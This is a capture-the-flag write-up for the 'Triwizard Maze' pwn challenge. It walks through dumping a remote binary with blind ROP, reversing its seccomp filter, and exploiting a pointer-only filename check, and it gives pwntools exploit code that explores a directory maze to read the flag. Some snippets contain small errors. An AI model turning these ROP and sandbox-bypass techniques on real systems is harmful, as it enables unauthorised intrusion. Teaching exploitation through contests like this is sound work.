# CyberChallenge.IT 2024 - University CTF

## [pwn] Triwizard Maze (3 solves)

Are you a ROP wizard Harry???

**NOTE**: yes, there are no attachments for this challenge. This is intended.

`nc triwizard-maze.challs.external.open.ecsc2024.it 38202`

Author: Marco Bonelli <@mebeim>

### Introduction

The challenge does not have attachments and initially starts as "blind".
Connecting to the provided endpoint we get an ASCII art followed by some minimal
information:

```none
void print(const void *buf, size_t n) is at 0x13371f2b

Give me your x86 32bit ROP chain (exactly 1024 bytes):
```

So the remote is asking us to provide 1024 bytes of ROP chain to be run blindly,
however it also gives us the address of a `print()` function.

### Dumping the remote ELF

As already suggested from the initial prompt, the remote program is a 32-bit x86
binary. Using the provided `print()` function and creating a very simple ROP
chain of 1 call, we can dump memory at arbitrary addresses. Furthermore, the
address of the `print()` function does not change, which also tells us that
either the remote executable is not position independent, or that the remote
server has no ASLR enabled.

Probing around the address of the function itself allows us to discover that the
remote binary is an ELF, and it is mapped in memory starting at `0x13370000`.
This address can be found dumping backwards one page at a time starting from the
provided `print()` address aligned to page size (`addr & ~0xfff`). The magic
bytes `\x7fELF` mark the start of the ELF header.

```python
from pwn import *

context(arch='i386')

for offset in range(0, 0x100000, 0x1000):
	REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
	REMOTE.recvuntil(b'print(const void *buf, size_t n) is at ')
	print_fn = int(r.recvline(), 0)

	REMOTE.recvuntil(b'):\n')
	base = (print_fn & ~0xfff) - offset
	chain = flat(print_fn, 0, base, 4)
	REMOTE.send(chain.ljust(1024))

	try:
		if REMOTE.recvn(4) == b'\x7fELF':
			log.success('ELF base is at %x', base)
			break
	except EOFError:
		pass

	REMOTE.close()
```

We can then either start dumping one page (4096 bytes) at a time from the base
address until we hit an error, or we can simply dump a large amount of bytes all
in one go, assuming that the remote will crash as soon as it tries to read past
the end of the mapped ELF. Either approach works.

```python
REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)
chain = flat(print_fn, 0, base, 0x10000)
REMOTE.sendlineafter(b'):\n', chain.ljust(1024))

with open('dump.elf', 'rb') as f:
	f.write(r.recvall())

REMOTE.close()
```

A quick check with the [`file(1)`][man-1-file] and [`readelf(1)`][man-1-readelf]
commands tells us that this is indeed a 32-bit x86 ELF and the dump is valid
(all seems in order as `readelf` does not complain):

```none
$ file dump.elf
dump.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped

$ readelf -hlSW dump.elf
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x133732b5
  Start of program headers:          52 (bytes into file)
  Start of section headers:          16004 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         6
  Size of section headers:           40 (bytes)
  Number of section headers:         6
  Section header string table index: 5

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .text             PROGBITS        13371000 001000 0022d4 00  AX  0   0  1
  [ 2] .rodata           PROGBITS        133742e0 0032e0 000a71 00   A  0   0 32
  [ 3] .data             PROGBITS        13375d60 003d60 000100 00  WA  0   0 32
  [ 4] .bss              NOBITS          13375e60 003e60 000120 00  WA  0   0 32
  [ 5] .shstrtab         STRTAB          00000000 003e60 000024 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), p (processor specific)

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x13370034 0x13370034 0x000c0 0x000c0 R   0x4
  LOAD           0x000000 0x13370000 0x13370000 0x000f4 0x000f4 R   0x1000
  LOAD           0x001000 0x13371000 0x13371000 0x022d4 0x022d4 R E 0x1000
  LOAD           0x0032e0 0x133742e0 0x133742e0 0x00a71 0x00a71 R   0x1000
  LOAD           0x003d60 0x13375d60 0x13375d60 0x00100 0x00220 RW  0x1000
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0

 Section to Segment mapping:
  Segment Sections...
   00
   01
   02     .text
   03     .rodata
   04     .data .bss
   05
```

### Reverse-engineering

The dumped ELF file is static and stripped. Furthermore, no libc was statically
linked and its entire code seems to have been implemented from scratch. The only
enabled protection is NX, which means there will not be RWX memory sections (at
least unless the program maps some at runtime).

After loading the ELF into the binary analysis tool of our choice, we can start
reverse engineering. The job is significantly simplified by the fact that the
program is full of error strings of the form `SYSCALL FAILED: xxx` or
`CHECK FAILED: xxx` that reveal small pieces of its C source code. The program's
`main()` starts by reading a `FLAG=` variable from the environment and passing
it to a function.

This function creates a `/tmp/maze` directory, wipes out anything under the
`/tmp/maze/entry` directory (if it exist), re-creates it, and then enters a loop
to start creating directories with random names. The directory-creation loop
keeps an array of 32 structures of the form:

```c
struct node {
	int dirfd;
	unsigned n_children;
};

struct node dirs[32];
```

Initially, after changing directory to `/tmp/maze`, `dirs[0].dirfd` is set to
`open("entry", O_RDONLY, 0)`. Then, a loop of 368 iterations is executed,
starting with `i = 1` and cycling through the `dirs` array with a modulo
operation.

Each iteration:

- The `dirs[i % 32].dirfd` file descriptor is closed, and
  `dirs[i % 32].n_children` is set to `0`.
- A random "parent" node with `.dirfd != 1` and `.n_children < 10` is taken
  from `dirs`.
- A new directory is created under the chosen "parent" `.dirfd` using
  [`mkdirat(2)`][man-2-mkdirat] and then opened using
  [`openat(2)`][man-2-openat]. The returned FD is saved to `dirs[i % 32].dirfd`.
  The "parent" `.n_children` is also incremented.

This rather simple algorithm ends up generating a randomized directory
structure. The directory names are also randomized: they are between 16 and 64
characters long and include ASCII digits, upper-case and lower-case letters. The
underlying source of randonmess is the [`getrandom(2)`][man-2-getrandom]
syscall, wrapped in various helper functions.

Finally, a file named `triwizard_cup` is created under a randomply picked
directory among the last 32 directories left in `dirs[]` after the loop
completes. The flag string previously taken from the `FLAG=` environment
variable is then written to this file, and all file descriptors above `1` are
closed using the [`close_range(2)`][man-2-close_range] syscall. Given the
algorithm used, the final `triwizard_cup` file will be sitting at a non-trivial
depth (368 in the worst case, 18 in the best case) in the directory tree
originating from the `entry` directory.

Back in `main()`, now:

- The flag is wiped out from memory with a `memset()`.
- A new RW memory area is mapped through [`mmap(2)`][man-2-mmap] for the ROP
  chain.
- A [`seccomp(2)`][man-2-seccomp] filter is loaded through
  `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)` (see
  [`prctl(2)`][man-2-prctl]).
- A function is called to read exactly 1024 bytes from standard input into the
  RW mapping, which is then set as the new stack pointer (`mov esp,eax`) before
  returning (`ret`) to trigger the start of an arbitrary user-provided ROP
  chain.

The seccomp filter loaded before running the ROP chain can be either manually
reverse-engineered or dumped with the help of [`seccomp-tools`][seccomp-tools].
In fact, if correctly dumped, the remote ELF executable can be run locally under
`seccomp-tools dump` to disassemble and pretty print the seccomp BPF filter:

```none
$ FLAG=asd seccomp-tools ./dump.elf
...
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x15 0x08 0x00 0x00000059  if (A == readdir) goto 0012
0004: 0x15 0x07 0x00 0x00000003  if (A == read) goto 0012
0005: 0x15 0x06 0x00 0x00000004  if (A == write) goto 0012
0006: 0x15 0x05 0x00 0x00000006  if (A == close) goto 0012
0007: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0012
0008: 0x15 0x00 0x02 0x00000127  if (A != openat) goto 0011
0009: 0x20 0x00 0x00 0x00000018  A = filename # openat(dfd, filename, flags, mode)
0010: 0x15 0x01 0x00 0x13375d60  if (A == 0x13375d60) goto 0012
0011: 0x06 0x00 0x00 0x00000000  return KILL
0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

From what we can see above, the filter only allows a few syscalls: `readdir`,
`read`, `write`, `close` and `exit`. Additionally, it also allows `openat`, but
only if the passed file name (second argument) matches a given address. If we
look at what's at that address (either under GDB or using a disassembler) we can
see that it belongs to the `.data` section and contains the string
`"triwizard_cup"`.

### Bug(s)

The only "bug" present in the program is the incorrect whitelisting of the file
name `"triwizard_cup"` for the `openat` syscall using seccomp. The loaded filter
only checks whether the second syscall argument is equal to the fixed address
(`0x13375d60`) of the string, but it does not care about its memory contents.
Given that this adress is within the `.data` section of the binary, the string
resides in a readable and writeable memory segment. Overwriting the existing
string at that address allows to call `openat` with the same address as
argument, but effectively referring to a different file name than the original.

Other than this, the ROP functionality, despite potentially granting arbitrary
code execution, is part of the intended behavior of the program and not a real
bug.

### Solution

Given the above, it is now clear that the goal of the challenge is to *somehow*
explore the randomly generated directory tree under `/tmp/maze/entry` and find
the file called `triwizard_cup` to read its contents. To do this, we need to
implement a search function, like for example [BFS][wiki-bfs] or
[DFS][wiki-dfs]. Both of these work, but the latter is the simplest to
implement.

The maze is re-generated randomly each time the program start, so we cannot let
it exit or crash. The ROP chain we can give to the program is quite short (1024
bytes), but we can call the function responsible for reading and executing the
chain how many times we want if we put a call to it at the end of the chain
itself.

The functions we will need to call for our exploit are the following:

```python
EXE_SYMBOLS: dict[str,int] = {
	'syscall3'   : 0x133722cd, # long syscall3(long num, long a1, long a2, long a3)
	'print_str'  : 0x13372d29, # void print_str(const char *s)
	'write_exact': 0x13372f58, # void write_exact(int fd, const void *buf, size_t count)
	'read_exact' : 0x13372edc, # void read_exact(int fd, void *buf, size_t count)
	'read'       : 0x133723af, # ssize_t read(int fd, void *buf, size_t count)
	'openat'     : 0x1337238f, # int openat(int dirfd, const char *pathname, int flags, mode_t mode)
	'close'      : 0x133723e3, # int close(int fd)
	'go'         : 0x13371f47  # void go(void): asks for a new ROP chain and runs it
}
```

Additionally, let's also remember the memory location of the
`"triwizard_cup"` string, since to use `openat` we will need to overwrite it:

```python
EXE_SYMBOLS['triwizard_cup_fname'] = 0x13375d60
```

The program already implements all the functionality we need, so the only "raw"
ROP gadget we will need is one to clear the arguments on the stack after a
function call. The maximum number of arguments we'll pass is 4, and there's one
nice gadget that pops 4 registers at `0x13372339`:

```python
# 0x13372339:  5b    pop ebx
# 0x1337233a:  5e    pop esi
# 0x1337233b:  5f    pop edi
# 0x1337233c:  5d    pop ebp
# 0x1337233d:  c3    ret
CLEAN_STACK_GADGET = 0x13372339
```

Now we can implement some helper functions to generate and send our ROP chain.
First of all, a function that generates a ROP chain to make arbitrary function
calls would be nice. We can use the above symbols and the "clean stack" gadget
to do this:

```python
def call(funcname: str, *args: int) -> bytes:
	assert 0 <= len(args) <= 4, args

	if len(args) == 0:
		# No need to clean any args from the stack after the call
		clean_stack = ()
	else:
		# Need clean some args from the stack after the call, pop as many
		# registers as function arguments
		clean_stack = CLEAN_STACK_GADGET + 4 - len(args)

	return flat(EXE_SYMBOLS[funcname], clean_stack, args)
```

Then we can write an helper function that can send a chain and restart the
`go()` function to make the program ask for a new chain:

```python
def send_chain(chain: bytes):
	# Add a call to re-start the go() func to read a new chain after this one
	chain += call('go')
	assert len(chain) <= 1024, f'Chain too long: {len(chain)}'

	REMOTE.recvuntil(b'Give me your x86 32bit ROP chain (exactly 1024 bytes):\n')
	REMOTE.send(chain.ljust(1024, b'\0'))
```

To list the files in a directory we must open the directory first using the only
syscall we have to do this: `openat`. To use it, we need to pass the check
implemented by the seccomp filter: the second argument (`char *pathname`) needs
to be equal to `0x13375d60`. To do this, we can use the `read_exact()` function
at `0x13372edc` to read an arbitrary string at that address before passing it to
`openat`. Here's an helper function that does exactly this:

```python
def openat(dirfd: int, name: str):
	name = name.encode() + b'\0'
	chain = call('read_exact', 0, EXE_SYMBOLS['triwizard_cup_fname'], len(name))
	chain += call('openat', dirfd, EXE_SYMBOLS['triwizard_cup_fname'], 0, 0)
	send_chain(chain)
	REMOTE.send(name) # filename for openat(), read by read_exact()
```

It's also nice to be able to `close` directories as we don't know the remote
[`RLIMIT_NOFILE`][man-2-getrlimit] and we don't want to keep too many FDs open.
This is pretty simple, just a single call:

```python
def close(fd: int):
	send_chain(call('close', fd))
```

After opening a directory we can use the [`readdir(2)`][man-2-readdir] syscall
to list its entries. It takes a FD, a pointer to `struct old_linux_dirent` for
the output, and a third ignored argument. The output struct looks like this:

```c
struct old_linux_dirent {
	unsigned long d_ino;     /* inode number */
	unsigned long d_offset;  /* offset to this old_linux_dirent */
	unsigned short d_namlen; /* length of this d_name */
	char  d_name[1];         /* filename (null-terminated) */
}
```

The `d_name` field is at offset 4 + 4 + 2 = 10. To read the entries of a given
directory FD, we can issue the `readdir` syscall repeatedly, pointing the second
argument to a writeable memory area (for example in the `.bss`) and print the
`d_name` string each time using the `print_str()` function at `0x13372d29`. To
separate the names that are printed, we can locate and print a `"\n"` string
after each `d_name`: there are various `"\n"` used in propts or error messages
in the `.rodata` section; one is at `0x133700a5`.

Directories created by the maze generation function can have at most 10 entries
plus `.` and `..` that are always present, for a total of 12 entries. We can
therefore send a chain that makes 12 `readdir` calls, and 20 `print_str` calls
(10 for the names, 10 for the `"\n"` separator). Then, we will simply read 10
lines of output with `.recvline()` to get the names of the entries. If we find
duplicates, it means that we exhausted the entries and the syscall failed (and
did not overwrite the previous structure). Similarly, in case of an empty
directory, we will read `.`, then `..` and then `..` 10 more times.

The [`readdir(2)`][man-2-readdir] syscall does not already have a wrapper
implemented by the program, but we can call it using the `syscall3()` function
at `0x133722cd`, which simply does an arbitrary 3-argument syscall.

Here's a helper function to list the files in a directory given an open
directory file descriptor:

```python
from pwnlib.constants.linux.i386 import SYS_readdir

# Writeable memory for readdir to write struct old_linux_dirent
RW_BUF = 0x13375e70 # (.bss + 0x10)

def listdir(dirfd: int) -> list[str]:
	# Call readdir two times to skip "." and ".." as they are always present
	chain = call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
	chain += call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)

	# List at most 10 entries
	for _ in range(10):
		chain += call('syscall3', SYS_readdir, dirfd, RW_BUF, 0)
		chain += call('print_str', RW_BUF + 4 + 4 + 2) # d_name
		chain += call('print_str', 0x133700a5) # "\n"

	send_chain(chain)

	res = []
	last = None

	for _ in range(10):
		name = REMOTE.recvline(keepends=False).decode()

		# Skip duplicates, if we get any it just means there are < 10 entries
		if name != last:
			res.append(name)
			last = name

	# If we only get ".." it means there was nothing after "..", so this dir is empty
	if res == ['..']:
		return []
	return res
```

One last thing before implementing our search function: we need to be able to
read the contents of the final file we are looking for (`triwizard_cup`). This
is just a matter of `openat()` + `read()` + `write()`. Or if we want to be cool,
`openat()` + `read_exact()` + `write_exact()`, which is nicer (plus those
functions already implemented for us).

```python
def dumpfd(fd: int):
	chain = call('read', fd, RW_BUF, 0x100)
	chain += call('write_exact', 1, RW_BUF, 0x100)
	send_chain(chain)
	return REMOTE.recvn(0x100)
```

Now we can implement the actual search function. As mentioned at the beginning,
a recursive [DFS][wiki-dfs] is the simplest way to go:

- Start at the `/tmp/maze/entry` directory opening it with
  `openat(AT_FDCWD, "entry", O_RDONLY, 0)`.
- Iterate the entries of the current directory.
- For each entry:
- If its name is `"triwizard_cup"`, open and dump the file with `dumpfd()`.
- Otherwise, it's a directory: open it, explore it recursively and finally
  close it.

Since the program closes every file descriptor higher than `1` after creating
the maze, and `open`/`openat` always return the lowest free FD number, we know
that the first `openat` will return `2`. Each subsequent `openat` will return a
FD that is 1 higher than the last. Therefore, if we start with `dirfd = 2`, the
first entry we open will get FD `3`. If we then close it after exploring it, the
next entry will also get FD `3`, as well as all the other entries of the current
`dirfd`. This way, we don't have to worry about finding out the FD returned by
`readdir`. It's all 100% predictable.

Here's the search function:

```python
# Recursive DFS until we get to "triwizard_cup"
def explore_maze(dirfd: int):
	for fname in listdir(dirfd):
		if fname == 'triwizard_cup':
			# This is the file we were looking for: dump it
			openat(dirfd, fname)
			return dumpfd(dirfd + 1)

		# Otherwise, this is a directory: explore it recursively
		openat(dirfd, fname)
		flag = explore_maze(dirfd + 1)
		if flag is not None:
			return flag

		# Close current directory and keep going
		close(dirfd + 1)

	return None
```

Finally! Now let's get the flag:

```python
from pwnlib.constants.linux.i386 import AT_FDCWD

REMOTE = remote('triwizard-maze.challs.cyberchallenge.it', 38202)

openat(AT_FDCWD 'entry') # -> this will return FD 2
flag = explore_maze(2)
assert flag is not None

print(flag)
```

### Complete exploit

See [`checker/__main__.py`](checker/__main__.py) for the final automated exploit
script, which also dumps the remote ELF before solving the challenge as
explained above.

[man-1-file]: https://manned.org/man/file.1
[man-1-readelf]: https://manned.org/man/readelf.1
[man-2-close_range]: https://manned.org/man/close_range.2
[man-2-getrandom]: https://manned.org/man/getrandom.2
[man-2-getrlimit]: https://manned.org/man/getrlimit.2
[man-2-mkdirat]: https://manned.org/man/mkdirat.2
[man-2-mmap]: https://manned.org/man/mmap.2
[man-2-openat]: https://manned.org/man/openat.2
[man-2-prctl]: https://manned.org/man/prctl.2
[man-2-readdir]: https://manned.org/man/readdir.2
[man-2-seccomp]: https://manned.org/man/seccomp.2
[seccomp-tools]: https://github.com/david942j/seccomp-tools
[wiki-bfs]: https://en.wikipedia.org/wiki/Breadth-first_search
[wiki-dfs]: https://en.wikipedia.org/wiki/Depth-first_search
